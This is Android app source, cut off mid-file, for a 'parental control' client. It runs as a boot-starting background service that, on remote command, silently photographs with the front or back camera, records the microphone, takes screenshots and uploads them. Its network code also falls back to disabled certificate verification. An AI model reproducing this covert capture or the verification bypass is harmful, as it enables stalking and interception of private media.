# ============================================================
# BUDDY GUARD — main.py  (ULTRA-FAST REAL-TIME v4 — BACKGROUND)
# Single file Python/Kivy → builds to APK via GitHub Actions
#
# NEW in v4:
#   ✔ True Android Foreground Service — survives app close
#   ✔ Auto-starts on device boot (BOOT_COMPLETED receiver)
#   ✔ Service keeps polling/executing all commands in background
#   ✔ UI is optional — everything works with app closed
#   ✔ Persistent sticky notification "Buddy Guard is active"
#   ✔ Service restarts itself if killed (START_STICKY)
#   ✔ All camera / audio / screenshot run from service thread
#   ✔ Minimise-on-pair: app goes to background after pairing
#
# HOW IT WORKS:
#   The Kivy app starts an Android Service (separate process).
#   The service runs the poll+heartbeat loop forever.
#   Even if the user closes the app, the service keeps running.
#   On boot, the BOOT_COMPLETED broadcast restarts the service.
#
# buildozer.spec additions needed:
#   services = Guard:service.py
#   android.permissions =
#       CAMERA,RECORD_AUDIO,FOREGROUND_SERVICE,
#       FOREGROUND_SERVICE_CAMERA,FOREGROUND_SERVICE_MICROPHONE,
#       RECEIVE_BOOT_COMPLETED,VIBRATE,POST_NOTIFICATIONS,
#       WRITE_EXTERNAL_STORAGE,READ_EXTERNAL_STORAGE,
#       INTERNET,ACCESS_NETWORK_STATE,WAKE_LOCK,
#       REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
#   android.meta_data = ...  (see bottom of this file)
# ============================================================

from __future__ import annotations
import os, sys, time, json, uuid, socket, threading, traceback
from concurrent.futures import ThreadPoolExecutor

# ============================================================
# SSL — must run before ANY network import
# ============================================================
def _setup_ssl():
    try:
        import certifi
        p = certifi.where()
        if os.path.exists(p):
            os.environ['SSL_CERT_FILE']      = p
            os.environ['REQUESTS_CA_BUNDLE'] = p
            return p
    except Exception: pass
    for p in ['/system/etc/security/cacerts',
              '/etc/ssl/certs/ca-certificates.crt',
              '/etc/ssl/cert.pem']:
        if os.path.exists(p):
            os.environ['SSL_CERT_FILE']      = p
            os.environ['REQUESTS_CA_BUNDLE'] = p
            return p
    return False

SSL_VERIFY = _setup_ssl()
if SSL_VERIFY is False:
    try:
        import urllib3
        urllib3.disable_warnings()
    except Exception: pass

# ============================================================
# TCP_NODELAY + SO_KEEPALIVE
# ============================================================
try:
    from urllib3.util import connection as _uc
    _orig = _uc.create_connection
    def _fast(address, *a, **kw):
        s = _orig(address, *a, **kw)
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.setsockopt(socket.SOL_SOCKET,  socket.SO_KEEPALIVE, 1)
        return s
    _uc.create_connection = _fast
except Exception: pass

# ============================================================
# KIVY
# ============================================================
os.environ.setdefault('KIVY_NO_CONSOLELOG', '0')
from kivy.app import App
from kivy.clock import Clock, mainthread
from kivy.core.window import Window
from kivy.metrics import dp
from kivy.uix.screenmanager import ScreenManager, Screen, FadeTransition
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.floatlayout import FloatLayout
from kivy.uix.scrollview import ScrollView
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.uix.widget import Widget
from kivy.graphics import Color, Rectangle, RoundedRectangle
from kivy.utils import platform
from kivy.storage.jsonstore import JsonStore

# ============================================================
# CONFIG
# ============================================================
API_BASE       = "https://mirab.ayamilcoders.com/api.php"
LONG_TIMEOUT   = 20
HEARTBEAT_SECS = 25
CMD_WORKERS    = 8
STORE_FILE     = "buddy_device.json"
IS_ANDROID     = (platform == 'android')

# Service name must match buildozer.spec  services = Guard:service.py
SERVICE_NAME   = "Guard"

# ============================================================
# STORAGE
# ============================================================
def _store() -> JsonStore:
    return JsonStore(STORE_FILE)

def store_get(key, field, default=None):
    try:
        s = _store()
        return s.get(key).get(field, default) if s.exists(key) else default
    except Exception: return default

def store_put(key, **kw):
    try: _store().put(key, **kw); return True
    except Exception: return False

def store_del(key):
    try: _store().delete(key)
    except Exception: pass

def store_has(key) -> bool:
    try: return _store().exists(key)
    except Exception: return False

# ============================================================
# ANDROID JNI IMPORTS
# ============================================================
_perms_ok = False
PA        = None
_ctx_fn   = None

if IS_ANDROID:
    try:
        from android.permissions import request_permissions, Permission
        _perms_ok = True
    except Exception as e:
        print(f"[ANDROID] permissions: {e}")

    def _ai(cls):
        try:
            from jnius import autoclass
            return autoclass(cls)
        except Exception as e:
            print(f"[JNI] {cls}: {e}"); return None

    PA             = _ai('org.kivy.android.PythonActivity')
    _Context       = _ai('android.content.Context')
    _Intent        = _ai('android.content.Intent')
    _NotifMgr      = _ai('android.app.NotificationManager')
    _NotifBuilder  = _ai('android.app.Notification$Builder')
    _NotifChan     = _ai('android.app.NotificationChannel')
    _NotifCompat   = _ai('androidx.core.app.NotificationCompat$Builder')
    _String        = _ai('java.lang.String')
    _MediaRecorder = _ai('android.media.MediaRecorder')
    _Camera        = _ai('android.hardware.Camera')
    _Build         = _ai('android.os.Build')
    _BuildVer      = _ai('android.os.Build$VERSION')
    _SurfaceTex    = _ai('android.graphics.SurfaceTexture')
    _PowerMgr      = _ai('android.os.PowerManager')
    _PendingIntent = _ai('android.app.PendingIntent')

    if PA:
        def _ctx_fn():
            return PA.mActivity.getApplicationContext()

    try:
        from jnius import PythonJavaClass, java_method as _jm
        _PJC       = PythonJavaClass
        _java_meth = _jm
    except Exception:
        _PJC = _java_meth = None

else:
    _Context=_Intent=_NotifMgr=_NotifBuilder=_NotifChan=_NotifCompat=None
    _String=_MediaRecorder=_Camera=_Build=_BuildVer=_SurfaceTex=None
    _PowerMgr=_PendingIntent=None
    _PJC=_java_meth=None

# ============================================================
# WAKELOCK
# ============================================================
_wl = None
def _acquire_wl():
    global _wl
    if IS_ANDROID and _PowerMgr and _ctx_fn:
        try:
            ctx = _ctx_fn()
            pm  = ctx.getSystemService('power')
            wl  = pm.newWakeLock(_PowerMgr.PARTIAL_WAKE_LOCK, "BuddyGuard::Poll")
            wl.acquire(); _wl = wl
            print("[WL] acquired")
        except Exception as e: print(f"[WL] {e}")

def _release_wl():
    global _wl
    if _wl:
        try: _wl.release()
        except Exception: pass
        _wl = None

# ============================================================
# START / STOP BACKGROUND SERVICE
# Called from UI process to control the service process
# ============================================================
def start_service():
    """Start the Buddy Guard foreground service."""
    if not IS_ANDROID: return
    try:
        from android import mActivity
        from jnius import autoclass
        Service = autoclass(f'org.test.buddyguard.Service{SERVICE_NAME}')
        Service.start(mActivity, '')
        print("[SVC] service start requested")
    except Exception as e:
        print(f"[SVC] start error: {e}")
        # Fallback: try via Intent
        try:
            from jnius import autoclass
            ctx     = PA.mActivity.getApplicationContext()
            pkg     = ctx.getPackageName()
            Intent  = autoclass('android.content.Intent')
            intent  = Intent()
            intent.setClassName(pkg, f'{pkg}.Service{SERVICE_NAME}')
            ctx.startForegroundService(intent)
        except Exception as e2:
            print(f"[SVC] fallback start error: {e2}")

def stop_service():
    """Stop the Buddy Guard foreground service."""
    if not IS_ANDROID: return
    try:
        from android import mActivity
        from jnius import autoclass
        Service = autoclass(f'org.test.buddyguard.Service{SERVICE_NAME}')
        Service.stop(mActivity)
        print("[SVC] service stop requested")
    except Exception as e:
        print(f"[SVC] stop error: {e}")

def is_service_running() -> bool:
    """Check if our service is currently running."""
    if not IS_ANDROID: return False
    try:
        from jnius import autoclass
        ctx        = PA.mActivity.getApplicationContext()
        ActivityMgr = autoclass('android.app.ActivityManager')
        am         = ctx.getSystemService('activity')
        services   = am.getRunningServices(50)
        pkg        = ctx.getPackageName()
        svc_name   = f'{pkg}.Service{SERVICE_NAME}'
        for info in services.toArray():
            if svc_name in str(info.service.getClassName()):
                return True
        return False
    except Exception:
        return False

# ============================================================
# DEVICE INFO
# ============================================================
def get_uid() -> str:
    if IS_ANDROID and PA:
        try:
            from jnius import autoclass
            S   = autoclass('android.provider.Settings$Secure')
            ctx = PA.mActivity.getApplicationContext()
            uid = S.getString(ctx.getContentResolver(), S.ANDROID_ID)
            if uid: return uid
        except Exception: pass
    stored = store_get('meta', 'uid')
    if stored: return stored
    new = str(uuid.uuid4()).replace('-', '')[:16]
    store_put('meta', uid=new)
    return new

def get_info() -> dict:
    if IS_ANDROID and _Build and _BuildVer:
        try:
            return {'device_name':     str(_Build.MODEL),
                    'model':           str(_Build.MODEL),
                    'android_version': str(_BuildVer.RELEASE)}
        except Exception: pass
    return {'device_name': 'Buddy Device', 'model': 'Android', 'android_version': '?'}

# ============================================================
# ANDROID ACTIONS  (camera / audio / notify / lock)
# These run inside the service process
# ============================================================
def do_notify(title: str, msg: str):
    if IS_ANDROID and _ctx_fn and _NotifMgr and _NotifBuilder:
        try:
            ctx = _ctx_fn()
            CH  = "bg_v4_msg"
            nm  = ctx.getSystemService('notification')
            if _NotifChan:
                try:
                    ch = _NotifChan(CH,
                                    "Buddy Guard Messages" if not _String else _String("Buddy Guard Messages"),
                                    _NotifMgr.IMPORTANCE_HIGH)
                    nm.createNotificationChannel(ch)
                except Exception: pass
            b = _NotifBuilder(ctx, CH)
            b.setSmallIcon(ctx.getApplicationInfo().icon)
            b.setContentTitle(_String(title) if _String else title)
            b.setContentText(_String(msg)   if _String else msg)
            b.setAutoCancel(True)
            nm.notify(9002, b.build())
            return
        except Exception as e: print(f"[NOTIFY] {e}")
    print(f"[NOTIFY] {title}: {msg}")

def do_lock():
    if IS_ANDROID and PA and _Context:
        try:
            ctx = PA.mActivity.getApplicationContext()
            ctx.getSystemService(_Context.DEVICE_POLICY_SERVICE).lockNow()
            return
        except Exception as e: print(f"[LOCK] {e}")
    print("[LOCK] stub")

def do_camera(facing='back') -> bytes | None:
    if not IS_ANDROID or not _Camera:
        print(f"[CAM] stub {facing}"); return None
    cam_id = 1 if facing == 'front' else 0
    cam = None; buf = []; evt = threading.Event()
    try:
        for try_id in [cam_id, 1 - cam_id]:
            try: cam = _Camera.open(try_id); break
            except Exception: cam = None
        if cam is None: return None
        if _SurfaceTex:
            try: cam.setPreviewTexture(_SurfaceTex(0))
            except Exception: pass
        cam.startPreview()
        time.sleep(0.8)
        if _PJC and _java_meth:
            class _CB(_PJC):
                __javainterfaces__ = ['android/hardware/Camera$PictureCallback']
                __javacontext__    = 'app'
                @_java_meth('([BLandroid/hardware/Camera;)V')
                def onPictureTaken(self, data, camera):
                    if data: buf.append(bytes(data))
                    evt.set()
            cam.takePicture(None, None, _CB())
        else:
            evt.set()
        evt.wait(timeout=5)
        cam.stopPreview(); cam.release()
        return buf[0] if buf else None
    except Exception as e:
        print(f"[CAM] {e}")
        if cam:
            try: cam.release()
            except Exception: pass
        return None

def do_audio(seconds=15) -> str | None:
    if not IS_ANDROID or not _MediaRecorder:
        print(f"[AUD] stub {seconds}s"); return None
    rec = None
    try:
        path = '/sdcard/bg_audio.mp4'
        rec  = _MediaRecorder()
        rec.setAudioSource(_MediaRecorder.AudioSource.MIC)
        rec.setOutputFormat(_MediaRecorder.OutputFormat.MPEG_4)
        rec.setAudioEncoder(_MediaRecorder.AudioEncoder.AAC)
        rec.setOutputFile(path)
        rec.prepare(); rec.start()
        time.sleep(max(1, seconds))
        rec.stop(); rec.release()
        return path if os.path.exists(path) else None
    except Exception as e:
        print(f"[AUD] {e}")
        if rec:
            try: rec.release()
            except Exception: pass
        return None

# ============================================================
# HTTP SESSION
# Content-Type is NOT set at session level (causes body loss on Android)
# ============================================================
import requests as _rq

def _make_session() -> _rq.Session:
    from requests.adapters import HTTPAdapter
    s = _rq.Session()
    s.verify = SSL_VERIFY
    s.headers.update({
        'Accept-Encoding': 'gzip, deflate',
        'Connection':      'keep-alive',
        'Accept':          'application/json',
        'Cache-Control':   'no-cache',
        'X-Client':        'BuddyGuard-v4',
    })
    a = HTTPAdapter(pool_connections=3, pool_maxsize=8, max_retries=0)
    s.mount('https://', a); s.mount('http://', a)
    return s

# ============================================================
# API CLIENT
# ============================================================
class Api:
    def __init__(self, base: str):
        self.base = base.rstrip('/')
        self.sess = _make_session()
        threading.Thread(target=self._warmup, daemon=True).start()

    def _warmup(self):
        try: self.sess.get(f"{self.base}?action=ping", timeout=6); print("[API] warmed")
        except Exception: pass

    def _url(self, action): return f"{self.base}?action={action}"

    def _post(self, action, data, timeout=10) -> dict:
        url = self._url(action)
        for v in list(dict.fromkeys([self.sess.verify, False])):
            try:
                r = self.sess.post(url,
                                   data=json.dumps(data),
                                   headers={'Content-Type': 'application/json'},
                                   timeout=timeout, verify=v)
                print(f"[API] POST {action} HTTP {r.status_code}")
                return self._parse(r)
            except _rq.exceptions.SSLError: continue
            except Exception as e: raise
        return {}

    def _get(self, action, params=None, timeout=10) -> dict:
        url = self._url(action)
        for v in list(dict.fromkeys([self.sess.verify, False])):
            try:
                r = self.sess.get(url, params=params, timeout=timeout, verify=v)
                return self._parse(r)
            except _rq.exceptions.SSLError: continue
            except Exception as e: raise
        return {}

    @staticmethod
    def _parse(r) -> dict:
        try:
            raw = r.text.strip() if r.text else ''
            if not raw: return {}
            idx = next((i for i, c in enumerate(raw) if c in '{['), -1)
            if idx == -1:
                print(f"[API] non-JSON HTTP {r.status_code}: {raw[:120]}")
                if r.status_code == 403: return {'success': False, 'error': 'Access denied (403).'}
                if r.status_code == 404: return {'success': False, 'error': 'API not found (404).'}
                if r.status_code >= 500: return {'success': False, 'error': f'Server error ({r.status_code}).'}
                return {'success': False, 'error': f'Unexpected response (HTTP {r.status_code}).'}
            if idx > 0: print(f"[API] stripped {idx} bytes PHP noise")
            result = json.loads(raw[idx:])
            return result
        except json.JSONDecodeError as e:
            print(f"[API] JSON error: {e}")
            return {'success': False, 'error': 'Invalid JSON from server.'}
        except Exception as e:
            print(f"[API] parse error: {e}")
            return {'success': False, 'error': str(e)}

    def pair(self, pair_key, uid, info, fcm='') -> dict:
        payload = {'key_code': pair_key, 'device_uid': uid, 'fcm_token': fcm}
        payload.update(info)
        print(f"[API] pairing key={pair_key} uid={uid}")
        return self._post('device/pair', payload, timeout=30)

    def heartbeat(self, uid) -> dict:
        try: return self._post('device/heartbeat', {'device_uid': uid}, timeout=6)
        except Exception: return {}

    def poll_long(self, uid, timeout=LONG_TIMEOUT) -> list:
        try:
            r = self._get('device/poll',
                          params={'device_uid': uid, 'timeout': timeout},
                          timeout=timeout + 10)
            return r.get('commands', []) if isinstance(r, dict) else []
        except Exception as e:
            print(f"[POLL] {e}"); return []

    def poll_short(self, uid) -> list:
        try:
            r = self._get('device/poll', params={'device_uid': uid}, timeout=8)
            return r.get('commands', []) if isinstance(r, dict) else []
        except Exception as e:
            print(f"[POLL-S] {e}"); return []

    def ack(self, cmd_id, status='executed'):
        def _go():
            try: self._post('device/ack', {'command_id': cmd_id, 'status': status}, timeout=6)
            except Exception: pass
        threading.Thread(target=_go, daemon=True).start()

    def upload_file(self, uid, media_type, path, cmd_id=None):
        if not path or not os.path.exists(path): return
        def _go():
            try:
                data = {'device_uid': uid, 'media_type': media_type}
                if cmd_id: data['command_id'] = str(cmd_id)
                with open(path, 'rb') as f:
                    self.sess.post(self._url('device/upload'),
                                   files={'file': f}, data=data,
                                   timeout=60, verify=self.sess.verify)
            except Exception as e: print(f"[UP] {e}")
        threading.Thread(target=_go, daemon=True).start()

    def upload_bytes(self, uid, media_type, raw, fname, cmd_id=None):
        def _go():
            import io
            try:
                data = {'device_uid': uid, 'media_type': media_type}
                if cmd_id: data['command_id'] = str(cmd_id)
                self.sess.post(self._url('device/upload'),
                               files={'file': (fname, io.BytesIO(raw), 'image/jpeg')},
                               data=data, timeout=60, verify=self.sess.verify)
            except Exception as e: print(f"[UP-B] {e}")
        threading.Thread(target=_go, daemon=True).start()


api = Api(API_BASE)

# ============================================================
# COMMAND EXECUTOR
# ============================================================
_PRIO = {'lock_screen':0,'lock_timed':0,'unlock_screen':1,
         'send_notification':2,'request_screenshot':3,
         'request_front_camera':4,'request_back_camera':4,
         'request_audio':5,'request_screen_record':6}

class Executor:
    def __init__(self, uid: str):
        self.uid   = uid
        self._pool = ThreadPoolExecutor(max_workers=CMD_WORKERS, thread_name_prefix='exec')
        self._seen: set[int] = set()
        self._lock = threading.Lock()

    def run_batch(self, cmds: list):
        if not cmds: return
        cmds = sorted(cmds, key=lambda c: _PRIO.get(c.get('command_type', ''), 9))
        for c in cmds:
            cid = c.get('id', 0)
            with self._lock:
                if cid in self._seen: continue
                self._seen.add(cid)
            self._pool.submit(self._safe, c)

    def _safe(self, c):
        try:   self._run(c)
        except Exception as e:
            print(f"[EXEC] crash: {e}\n{traceback.format_exc()}")
            api.ack(c.get('id', 0), 'failed')

    def _run(self, c):
        t   = c.get('command_type', '')
        p   = c.get('payload') or {}
        if isinstance(p, str):
            try: p = json.loads(p)
            except Exception: p = {}
        cid = c.get('id', 0)
        print(f"[EXEC] ▶ {t} id={cid}")

        if t == 'lock_screen':
            do_lock(); api.ack(cid)

        elif t == 'lock_timed':
            mins = int(p.get('minutes', 5))
            do_lock()
            do_notify("Screen Locked", f"Locked for {mins} min by parent.")
            api.ack(cid)

        elif t == 'unlock_screen':
            do_notify("Screen Unlocked", "Your device has been unlocked.")
            api.ack(cid)

        elif t == 'send_notification':
            do_notify(p.get('title', 'Message'), p.get('message', ''))
            api.ack(cid)

        elif t == 'request_screenshot':
            self._screenshot(cid)

        elif t == 'request_front_camera':
            self._camera('front', cid)

        elif t == 'request_back_camera':
            self._camera('back', cid)

        elif t == 'request_audio':
            secs = int(p.get('seconds', 15))
            self._audio(secs, cid)

        elif t == 'request_screen_record':
            do_notify("Screen Sharing", "Parent requested screen view.")
            api.ack(cid)

        else:
            print(f"[EXEC] unknown: {t}"); api.ack(cid, 'failed')

    def _screenshot(self, cid):
        try:
            path = '/sdcard/bg_screen.png'
            app  = App.get_running_app()
            if app and hasattr(app, 'root_window') and app.root_window:
                app.root_window.screenshot(name=path)
                time.sleep(0.2)
            if os.path.exists(path):
                api.upload_file(self.uid, 'screenshot', path, cid); api.ack(cid)
            else:
                api.ack(cid, 'failed')
        except Exception as e:
            print(f"[SS] {e}"); api.ack(cid, 'failed')

    def _camera(self, facing, cid):
        try:
            data = do_camera(facing)
            if data:
                fname = f"{facing}_{int(time.time())}.jpg"
                mtype = 'front_cam' if facing == 'front' else 'back_cam'
                api.upload_bytes(self.uid, mtype, data, fname, cid)
                api.ack(cid)
            else:
                api.ack(cid, 'failed')
        except Exception as e:
            print(f"[CAM] {e}"); api.ack(cid, 'failed')

    def _audio(self, secs, cid):
        try:
            path = do_audio(secs)
            if path and os.path.exists(path):
                api.upload_file(self.uid, 'audio', path, cid); api.ack(cid)
            else:
                api.ack(cid, 'failed')
        except Exception as e:
            print(f"[AUD] {e}"); api.ack(cid, 'failed')

    def shutdown(self):
        self._pool.shutdown(wait=False)

# ============================================================
# HEARTBEAT THREAD
# ============================================================
class HBThread(threading.Thread):
    def __init__(self, uid):
        super().__init__(daemon=True, name='hb')
        self.uid = uid; self._run_flag = True

    def run(self):
        while self._run_flag:
            for _ in range(HEARTBEAT_SECS * 10):
                if not self._run_flag: return
                time.sleep(0.1)
            try: api.heartbeat(self.uid)
            except Exception: pass

    def stop(self): self._run_flag = False

# ============================================================
# POLLER THREAD
# ============================================================
class Poller(threading.Thread):
    def __init__(self, uid, status_cb=None):
        super().__init__(daemon=True, name='poller')
        self.uid          = uid
        self._status_cb   = status_cb   # optional callable(text, color)
        self._stop_flag   = False
        self.executor     = Executor(uid)
        self._errors      = 0
        self._lp          = True
        self._fast_misses = 0
        self._last_cmd    = 0.0
        self._total       = 0

    def run(self):
        _acquire_wl()
        print(f"[POLL] started uid={self.uid}")
        self._status("⚡ Connecting…", (1, .78, .2, 1))
        while not self._stop_flag:
            try:
                self._cycle()
                self._errors = 0
            except Exception as e:
                self._errors += 1
                wait = min(2 ** self._errors, 30)
                print(f"[POLL] err #{self._errors}: {e} — wait {wait}s")
                self._status("Reconnecting…", (1, .78, .2, 1))
                self._sleep(wait)

    def _cycle(self):
        if self._lp:
            t0   = time.time()
            cmds = api.poll_long(self.uid, LONG_TIMEOUT)
            dt   = time.time() - t0
            if not cmds and dt < 0.6:
                self._fast_misses += 1
                if self._fast_misses >= 3:
                    self._lp = False
                    print("[POLL] LP not supported → short-poll")
            else:
                self._fast_misses = 0
        else:
            idle = time.time() - self._last_cmd if self._last_cmd else 9999
            cmds = api.poll_short(self.uid)
            self._sleep(5 if idle > 300 else 2)

        if cmds:
            self._last_cmd  = time.time()
            self._total    += len(cmds)
            print(f"[POLL] ▼ {len(cmds)} cmd(s) total={self._total}")
            self.executor.run_batch(cmds)
            self._status(f"⚡ Active — {self._total} cmd(s)", (.25, .80, .55, 1))

    def _sleep(self, s):
        d = time.time() + s
        while not self._stop_flag and time.time() < d:
            time.sleep(0.1)

    def _status(self, text, color):
        if self._status_cb:
            try: self._status_cb(text, color)
            except Exception: pass

    def stop(self):
        self._stop_flag = True
        self.executor.shutdown()
        _release_wl()

# ============================================================
# FOREGROUND SERVICE HELPER
# Posts the persistent "Buddy Guard is active" notification
# that keeps the service alive even with app closed
# ============================================================
def _post_fg_notification(ctx):
    """
    Post the sticky foreground notification.
    Must be called within 5 seconds of service start on Android 8+.
    """
    if not IS_ANDROID: return
    try:
        CH_ID = "bg_fg_svc"
        nm    = ctx.getSystemService('notification')

        # Create notification channel (Android 8+)
        if _NotifChan:
            try:
                ch = _NotifChan(
                    CH_ID,
                    "Buddy Guard Service" if not _String else _String("Buddy Guard Service"),
                    _NotifMgr.IMPORTANCE_LOW,   # LOW = no sound, but persistent
                )
                ch.setShowBadge(False)
                nm.createNotificationChannel(ch)
            except Exception as e:
                print(f"[FG_NOTIF] channel: {e}")

        # Build notification
        b = _NotifBuilder(ctx, CH_ID)
        b.setSmallIcon(ctx.getApplicationInfo().icon)
        b.setContentTitle(_String("Buddy Guard") if _String else "Buddy Guard")
        b.setContentText(_String("Monitoring active in background") if _String
                         else "Monitoring active in background")
        b.setOngoing(True)           # cannot be dismissed by user
        b.setPriority(-1)            # PRIORITY_LOW
        b.setAutoCancel(False)

        # Tap notification → open app
        if _PendingIntent and _Intent and PA:
            try:
                intent = _Intent(ctx, PA)
                intent.setFlags(0x10000000)   # FLAG_ACTIVITY_NEW_TASK
                pi = _PendingIntent.getActivity(ctx, 0, intent,
                                                0x08000000)  # FLAG_IMMUTABLE
                b.setContentIntent(pi)
            except Exception: pass

        return b.build()
    except Exception as e:
        print(f"[FG_NOTIF] {e}")
        return None

# ============================================================
# SERVICE ENTRY POINT
# Kivy calls service.py as a separate process.
# We detect if we ARE the service by checking for
# the android.service module being available.
# ============================================================
def run_as_service():
    """
    Main function for the background service process.
    Called from service.py (see companion file below).
    """
    print("[SERVICE] Buddy Guard background service starting…")

    # Wait for storage to be ready
    time.sleep(1)

    uid = store_get('device', 'uid')
    if not uid:
        print("[SERVICE] No device UID — waiting for pairing…")
        # Poll until paired
        while True:
            time.sleep(5)
            uid = store_get('device', 'uid')
            if uid and store_get('device', 'paired', False):
                print(f"[SERVICE] Device paired, uid={uid}")
                break

    # Post foreground notification so Android won't kill us
    if IS_ANDROID and _ctx_fn:
        try:
            from jnius import autoclass
            # We need the service context here — use mService if available
            try:
                from android.service import AndroidService
                svc_ctx = AndroidService.mService
            except Exception:
                svc_ctx = _ctx_fn()

            notif = _post_fg_notification(svc_ctx)
            if notif:
                try:
                    # startForeground(id, notification)
                    svc_ctx.startForeground(9999, notif)
                    print("[SERVICE] startForeground OK")
                except Exception as e:
                    print(f"[SERVICE] startForeground: {e}")
        except Exception as e:
            print(f"[SERVICE] fg notif setup: {e}")

    # Acquire wake lock
    _acquire_wl()

    # Start heartbeat
    hb = HBThread(uid); hb.start()

    # Start poller — no UI callback since we're headless
    poller = Poller(uid, status_cb=None); poller.start()

    print("[SERVICE] All threads running. Service is live.")

    # Keep service thread alive
    try:
        while True:
            time.sleep(30)
            # Re-check uid in case of reset
            new_uid = store_get('device', 'uid')
            if new_uid and new_uid != uid:
                print("[SERVICE] UID changed, restarting threads")
                poller.stop(); hb.stop()
                uid = new_uid
                hb     = HBThread(uid); hb.start()
                poller = Poller(uid);   poller.start()
            elif not store_get('device', 'paired', False):
                print("[SERVICE] Device unpaired, stopping threads")
                poller.stop(); hb.stop()
                # Wait for re-pair
                while not store_get('device', 'paired', False):
                    time.sleep(5)
                uid    = store_get('device', 'uid')
                hb     = HBThread(uid); hb.start()
                poller = Poller(uid);   poller.start()
    except Exception as e:
        print(f"[SERVICE] main loop: {e}")
    finally:
        poller.stop(); hb.stop(); _release_wl()

# ============================================================
# DESIGN
# ============================================================
DARK  = (.06, .06, .10, 1)
CARD  = (.11, .11, .18, 1)
INP   = (.14, .14, .22, 1)
ACC   = (.30, .57, 1.0, 1)
WHITE = (1, 1, 1, 1)
GRAY  = (.55, .58, .65, 1)
GREEN = (.25, .80, .55, 1)
RED   = (1.0, .36, .36, 1)
WARN  = (1.0, .78, .20, 1)
LIVE  = (.20, .95, .50, 1)

def _rect_bg(w, c):
    with w.canvas.before:
        Color(*c); w._br = Rectangle(pos=w.pos, size=w.size)
    w.bind(pos=lambda s, v: setattr(s._br, 'pos', v),
           size=lambda s, v: setattr(s._br, 'size', v))

def _rnd_bg(w, c, r=16):
    with w.canvas.before:
        Color(*c); w._rr = RoundedRectangle(pos=w.pos, size=w.size, radius=[dp(r)])
    w.bind(pos=lambda s, v: setattr(s._rr, 'pos', v),
           size=lambda s, v: setattr(s._rr, 'size', v))

def _btn(text, bg=None, fg=WHITE, h=52, r=14, fs='16sp'):
    if bg is None: bg = ACC
    b = Button(text=text, size_hint=(1, None), height=dp(h),
               background_normal='', background_color=(0, 0, 0, 0),
               color=fg, font_size=fs, bold=True)
    _rnd_bg(b, bg, r); return b

def _inp(hint, pw=False):
    return TextInput(hint_text=hint, multiline=False, password=pw,
                     size_hint=(1, None), height=dp(50),
                     background_color=INP, foreground_color=WHITE,
                     hint_text_color=GRAY, cursor_color=ACC,
                     padding=[dp(14), dp(12)], font_size='15sp')

def _lbl(text, fs, color, h, align='center', bold=False):
    l = Label(text=text, font_size=fs, color=color, bold=bold,
              size_hint=(1, None), height=dp(h), halign=align, valign='middle')
    l.bind(size=l.setter('text_size')); return l

# ============================================================
# KEY ENTRY SCREEN
# ============================================================
class KeyScreen(Screen):
    def __init__(self, **kw):
        super().__init__(**kw)
        self._build()
        Window.bind(on_resize=lambda *_: Clock.schedule_once(lambda dt: self._build(), .05))

    def _build(self):
        self.clear_widgets()
        root = FloatLayout(); _rect_bg(root, DARK)
        sv   = ScrollView(size_hint=(1, 1), do_scroll_x=False)
        inner = BoxLayout(orientation='vertical', spacing=dp(12),
                          padding=[dp(20), dp(44), dp(20), dp(20)], size_hint_y=None)
        inner.bind(minimum_height=inner.setter('height'))

        card = BoxLayout(orientation='vertical', spacing=dp(12),
                         padding=[dp(22), dp(26), dp(22), dp(26)], size_hint=(1, None))
        _rnd_bg(card, CARD, 20)

        card.add_widget(_lbl("🛡️", '48sp', WHITE, 64))
        card.add_widget(_lbl("Buddy Guard", '26sp', WHITE, 40, bold=True))
        card.add_widget(_lbl("Parental Control — Child Device", '13sp', GRAY, 24))
        card.add_widget(_lbl("⚡ Runs in background • Auto-starts on boot", '12sp', LIVE, 22))

        sep = Widget(size_hint=(1, None), height=dp(1)); _rect_bg(sep, (.2, .2, .3, 1))
        card.add_widget(sep)
        card.add_widget(_lbl("Enter the key your parent gave you:", '13sp', GRAY, 22, 'left'))

        self.key_in = _inp("ABCD-1234-WXYZ-5678")

        self.st_lbl = Label(text='', font_size='13sp', color=RED,
                            size_hint=(1, None), height=dp(44),
                            halign='center', valign='top')
        self.st_lbl.bind(size=self.st_lbl.setter('text_size'))

        self.btn = _btn("Apply Key & Pair Device")
        self.btn.bind(on_press=self._apply)

        for w in [self.key_in, self.st_lbl, self.btn]:
            card.add_widget(w)
        card.height = (sum(getattr(c, 'height', 0) for c in card.children)
                       + dp(12) * (len(card.children) - 1) + dp(52))
        inner.add_widget(card)
        sv.add_widget(inner); root.add_widget(sv); self.add_widget(root)

    def _apply(self, *_):
        key   = self.key_in.text.strip().upper()
        clean = key.replace('-', '').replace(' ', '')
        if len(clean) < 8:
            self._status("Enter a valid key (at least 8 characters).")
            return
        self.btn.text = "Connecting…"; self.btn.disabled = True
        self._status('')
        threading.Thread(target=self._pair, args=(key,), daemon=True).start()

    def _pair(self, key):
        uid      = get_uid()
        info     = get_info()
        last_err = 'Pairing failed. Try again.'

        for attempt in range(1, 4):
            try:
                print(f"[PAIR] attempt {attempt}/3 key={key} uid={uid}")
                r = api.pair(key, uid, info)
                print(f"[PAIR] response: {r}")

                if r.get('success'):
                    store_put('device',
                              pair_key=key,
                              uid=uid,
                              dev_id=r.get('device_id', 0),
                              paired=True)
                    self._status('Paired! Starting background service…', ok=True)
                    time.sleep(0.5)
                    self._launch_service_and_go()
                    return

                else:
                    last_err = r.get('error', '') or 'Pairing failed. Check your key.'
                    print(f"[PAIR] server error: {last_err}")
                    break   # don't retry server errors

            except _rq.exceptions.SSLError:
                last_err = f"SSL error (attempt {attempt}/3)."
            except _rq.exceptions.ConnectionError:
                last_err = f"No internet (attempt {attempt}/3)."
            except _rq.exceptions.Timeout:
                last_err = f"Timed out (attempt {attempt}/3)."
            except Exception as e:
                last_err = f"Error: {str(e)[:60]}"
                traceback.print_exc()

            if attempt < 3:
                self._status(f"{last_err} Retrying…")
                time.sleep(2 ** attempt)

        self._status(last_err)
        self._reset_btn()

    @mainthread
    def _launch_service_and_go(self):
        # Start background service
        start_service()
        # Navigate to home
        app = App.get_running_app()
        app.sm.transition = FadeTransition()
        app.sm.current    = 'home'
        # Minimise app to background so service is clearly doing the work
        if IS_ANDROID and PA:
            try: PA.mActivity.moveTaskToBack(True)
            except Exception: pass

    @mainthread
    def _status(self, msg, ok=False):
        try:
            self.st_lbl.color = GREEN if ok else RED
            self.st_lbl.text  = msg
        except Exception: pass

    @mainthread
